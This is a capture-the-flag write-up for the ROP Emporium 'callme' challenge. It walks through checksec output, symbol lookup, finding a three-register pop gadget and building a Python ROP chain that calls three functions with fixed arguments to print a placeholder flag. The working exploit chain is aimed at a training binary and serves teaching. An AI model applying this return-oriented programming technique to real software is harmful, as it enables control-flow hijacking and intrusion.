# ☎️ callme – ROP Emporium Challenge

> Category: Binary Exploitation – ROP with Multiple Arguments  
> Difficulty: Medium  
> Arch: `amd64`  
> Objective: Call `callme_one()`, `callme_two()`, and `callme_three()` in order, each with the same 3 arguments, to print the flag.

---

## 🛠️ 1. Initial Analysis

From the challenge description:

> You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments:  
> `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d`

### Binary Protections:

```bash
checksec callme
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

✅ Good news:
- No PIE → addresses are fixed.
- No stack canary → we can overflow.
- Not stripped → symbols are visible.

---

## 🔍 2. Locating Symbols

```bash
nm callme
```

We find:

```
0000000000400720 T callme_one
0000000000400740 T callme_two
00000000004006f0 T callme_three
000000000040093c t usefulGadgets
```

We also confirm in Ghidra that all 3 `callme_*` functions are present and require 3 arguments each.

Since the binary is 64-bit, function arguments are passed in registers:

| Argument | Register |
|----------|----------|
| arg1     | `rdi`    |
| arg2     | `rsi`    |
| arg3     | `rdx`    |

---

## 🧱 3. Finding a Gadget

```bash
ROPgadget --binary callme | grep 'pop rdi'
```

Found:

```
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

This gadget is perfect — it lets us set all three required registers before calling each function.

---

## 🧪 4. Building the Payload

Buffer overflow offset: **40 bytes** (32 for buffer + 8 for saved RBP).

We need to perform this sequence 3 times, once for each function.

### Final Payload

```python
payload  = b"A" * 40  # Overflow buffer
# callme_one
payload += p64(0x40093c)  # pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400720)

# callme_two
payload += p64(0x40093c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400740)

# callme_three
payload += p64(0x40093c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x4006f0)
```

---

## 🎯 5. Result

The program prints the expected output and reveals the flag:

```
ROPE{a_placeholder_32byte_flag!}
```

---

## 🧠 Key Takeaways

- Understand the calling convention for 64-bit binaries.
- Look for gadgets that let you set multiple registers in a single step.
- Chain function calls with repeated gadget + args + function patterns.